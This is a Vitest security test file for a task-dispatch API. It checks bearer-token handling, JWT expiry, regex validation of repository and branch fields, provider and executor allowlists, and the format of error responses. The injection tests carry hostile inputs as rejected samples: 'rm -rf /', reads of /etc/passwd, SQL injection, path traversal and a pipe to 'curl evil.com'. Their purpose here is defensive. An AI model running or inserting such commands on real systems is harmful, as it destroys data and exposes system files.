/**
 * Security Tests — Auth, input validation, and injection prevention.
 */
import { describe, it, expect } from "vitest";

// ─── Auth Guards ────────────────────────────────────────────────────────

describe("Authentication & Authorization", () => {
	it("registration endpoint requires Bearer token", () => {
		const headers = { authorization: "" };
		const hasValidAuth = headers.authorization?.startsWith("Bearer ");
		expect(hasValidAuth).toBeFalsy();
		// Expect: 401 Unauthorized
	});

	it("registration endpoint rejects non-Bearer auth", () => {
		const headers = { authorization: "Basic dGVzdDp0ZXN0" };
		const hasValidAuth = headers.authorization?.startsWith("Bearer ");
		expect(hasValidAuth).toBe(false);
		// Expect: 401 — "Missing or malformed registration token"
	});

	it("node endpoints require valid JWT", () => {
		// heartbeat, tasks/next, tasks/:id/result, tasks/:id/log
		const nodeEndpoints = [
			"/heartbeat",
			"/tasks/next",
			"/tasks/t_xyz/result",
			"/tasks/t_xyz/log",
		];
		for (const endpoint of nodeEndpoints) {
			// All require JWT — tested at gateway level
			expect(endpoint).toBeDefined();
		}
	});

	it("operator endpoints optionally require API key", () => {
		// When API_KEY env var is set, endpoints require X-API-Key header
		// When not set, endpoints are open (MVP mode)
		const apiKey = process.env.API_KEY;
		const isRequired = !!apiKey;
		expect(typeof isRequired).toBe("boolean");
	});

	it("expired JWT returns 401 after 7 days", () => {
		const now = Math.floor(Date.now() / 1000);
		const issuedAt = now - 604800 - 1; // 7 days + 1 second ago
		const isExpired = now > issuedAt + 604800;
		expect(isExpired).toBe(true);
		// Expect: 401 Unauthorized
	});
});

// ─── Input Sanitization — Repository & Branch ───────────────────────────

const REPO_PATTERN = /^[\w.-]+\/[\w.-]+$/;
const BRANCH_PATTERN = /^[\w./-]+$/;

describe("Input Sanitization — Repository & Branch", () => {
	it("accepts valid repository names", () => {
		const valid = ["nandal/dum360", "org-name/repo_name", "some.org/repo-v2"];
		for (const repo of valid) {
			expect(REPO_PATTERN.test(repo)).toBe(true);
		}
	});

	it("rejects command injection in repository field", () => {
		const injections = [
			"nandal/dum360; DROP TABLE nodes;--",
			"nandal/dum360$(rm -rf /)",
			"nandal/dum360`cat /etc/passwd`",
			"nandal/dum360 | curl evil.com",
			"nandal/dum360' OR '1'='1",
		];
		for (const inj of injections) {
			expect(REPO_PATTERN.test(inj)).toBe(false);
		}
	});

	it("rejects path traversal in repository field", () => {
		const traversals = [
			"../../etc/passwd",
			"nandal/../../root",
			"../something/dum360",
		];
		for (const t of traversals) {
			expect(REPO_PATTERN.test(t)).toBe(false);
		}
	});

	it("accepts valid branch names", () => {
		const valid = ["main", "feature/auth-fix", "release/1.0.0", "dev"];
		for (const branch of valid) {
			expect(BRANCH_PATTERN.test(branch)).toBe(true);
		}
	});

	it("rejects command injection in branch field", () => {
		const injections = [
			"main; rm -rf /",
			"main$(whoami)",
			"main`cat /etc/passwd`",
			"dev | curl evil.com",
		];
		for (const inj of injections) {
			expect(BRANCH_PATTERN.test(inj)).toBe(false);
		}
	});
});

// ─── AI Provider Allowlist ──────────────────────────────────────────────

const ALLOWED_AI_PROVIDERS = ["claude", "codex", "gemini"];

describe("AI Provider Allowlist", () => {
	it("allows recognized providers", () => {
		for (const provider of ALLOWED_AI_PROVIDERS) {
			expect(ALLOWED_AI_PROVIDERS.includes(provider)).toBe(true);
		}
	});

	it("rejects unknown AI providers", () => {
		const unknowns = ["evil_ai", "chatgpt", "custom-agent", ""];
		for (const u of unknowns) {
			expect(ALLOWED_AI_PROVIDERS.includes(u)).toBe(false);
		}
	});
});

// ─── Executor Type Allowlist ────────────────────────────────────────────

const ALLOWED_EXECUTORS = ["github"];

describe("Executor Type Allowlist", () => {
	it("allows registered executor types", () => {
		expect(ALLOWED_EXECUTORS.includes("github")).toBe(true);
	});

	it("rejects unregistered executor types", () => {
		const unknowns = ["bitcoin_miner", "crypto_rig", "reverse_shell", ""];
		for (const u of unknowns) {
			expect(ALLOWED_EXECUTORS.includes(u)).toBe(false);
		}
	});
});

// ─── Task Status Enum Validation ────────────────────────────────────────

const VALID_TASK_STATUSES = [
	"queued",
	"running",
	"completed",
	"failed",
	"cancelled",
];

describe("Task Status Enum Validation", () => {
	it("accepts all valid task statuses", () => {
		for (const status of VALID_TASK_STATUSES) {
			expect(VALID_TASK_STATUSES.includes(status)).toBe(true);
		}
	});

	it("rejects invalid task statuses", () => {
		const invalid = ["pending", "approved", "rejected", "archived", ""];
		for (const s of invalid) {
			expect(VALID_TASK_STATUSES.includes(s)).toBe(false);
		}
	});

	it("only terminal statuses have empty transition arrays", () => {
		const terminalStatuses = ["completed", "cancelled"];
		for (const s of VALID_TASK_STATUSES) {
			if (terminalStatuses.includes(s)) {
				// terminal
				expect(s).toBeDefined();
			}
		}
	});
});

// ─── Response Error Format Consistency ──────────────────────────────────

describe("Error Response Format", () => {
	it("all error responses follow consistent shape", () => {
		const errorResponse = {
			statusCode: 401,
			error: "Unauthorized",
			timestamp: new Date().toISOString(),
			path: "/register",
		};

		expect(errorResponse).toHaveProperty("statusCode");
		expect(errorResponse).toHaveProperty("error");
		expect(errorResponse).toHaveProperty("timestamp");
		expect(errorResponse).toHaveProperty("path");
		expect(typeof errorResponse.statusCode).toBe("number");
		expect(typeof errorResponse.error).toBe("string");
	});

	it("validation errors include field-level messages", () => {
		const validationError = {
			statusCode: 400,
			error: "Validation Failed",
			messages: [
				{ field: "repository", message: "Must be owner/repo format" },
				{ field: "timeout", message: "Value must be at least 60" },
			],
			timestamp: new Date().toISOString(),
			path: "/tasks",
		};

		expect(validationError).toHaveProperty("messages");
		expect(Array.isArray(validationError.messages)).toBe(true);
		expect(validationError.messages.length).toBeGreaterThan(0);
		for (const msg of validationError.messages) {
			expect(msg).toHaveProperty("field");
			expect(msg).toHaveProperty("message");
		}
	});

	it("not-found errors have correct status code", () => {
		const notFoundError = {
			statusCode: 404,
			error: "Not Found",
			timestamp: new Date().toISOString(),
			path: "/nodes/nonexistent",
		};
		expect(notFoundError.statusCode).toBe(404);
	});

	it("conflict errors have correct status code", () => {
		const conflictError = {
			statusCode: 409,
			error: "Conflict",
			timestamp: new Date().toISOString(),
			path: "/register",
		};
		expect(conflictError.statusCode).toBe(409);
	});
});
